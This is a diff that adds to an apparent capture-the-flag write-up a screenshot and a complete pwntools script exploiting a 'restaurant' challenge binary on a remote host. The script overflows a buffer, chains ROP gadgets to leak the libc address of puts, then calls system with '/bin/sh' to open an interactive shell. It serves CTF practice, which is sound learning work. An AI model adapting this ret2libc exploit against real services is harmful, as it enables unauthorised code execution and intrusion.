@@ -1833,3 +1833,103 @@ Some solutions:
 
 <br>
 
+
+
+
+<br>
+
+
+<br>
+
+
+
+---
+
+
+
+
+<br>
+
+<br>
+
+
+<img width="628" height="502" alt="image" src="https://github.com/user-attachments/assets/647f7425-48fa-45b6-9c6b-f997aa2b7a42" />
+
+
+
+
+
+
+<br>
+
+
+<br>
+
+
+```python
+from pwn import *
+
+
+libc = ELF('/home/connor/t/pwn_restaurant/libc.so.6')
+elf = ELF('/home/connor/t/pwn_restaurant/restaurant')
+PUTS_PLT = elf.plt['puts']
+PUTS_GOT = elf.got['puts']
+
+
+# gadgets in the elf
+POP_RDI_GADGET = p64(0x4010a3)
+RET_GADGET = p64(0x4007aa)
+
+
+io = remote('154.57.164.82', 31484)
+print(io.recvuntil(b'1. Fill my dish.\n2. Drink something\n> '))
+io.sendline(b'1')
+print(io.recvuntil(b'You can also order something else.\n> \x1b[0m'))
+print('\n'*10)
+
+
+
+payload = b'A' * 0x20 + b'oldrbpxx'
+
+
+random_str = 0x0040115b
+# print random string
+payload += POP_RDI_GADGET + p64(random_str)
+payload += p64(PUTS_PLT)
+
+# leak libc addr of puts function
+payload += POP_RDI_GADGET + p64(PUTS_GOT)
+payload += p64(PUTS_PLT)
+
+# restart function
+payload += RET_GADGET + p64(elf.symbols['fill'])
+
+
+io.sendline(payload)
+print(io.recvuntil(b'deleted\n'))
+puts_libc = int(io.recv(6)[::-1].hex(), 16)
+print(f'{hex(puts_libc) = }')
+
+########################
+
+LIBC_BASE = puts_libc - libc.symbols['puts']
+LIBC_SYSTEM = LIBC_BASE + libc.symbols['system']
+binsh = LIBC_BASE + 1785370
+
+print(io.recvuntil(b'You can also order something else.\n> \x1b[0m'))
+payload2 = b'A' * 0x20 + b'oldrbpxx'
+payload2 += POP_RDI_GADGET + p64(binsh)
+payload2 += RET_GADGET + p64(LIBC_SYSTEM)
+
+io.send(payload2)
+io.interactive()
+
+
+```
+
+
+
+<br>
+
+<br>
+
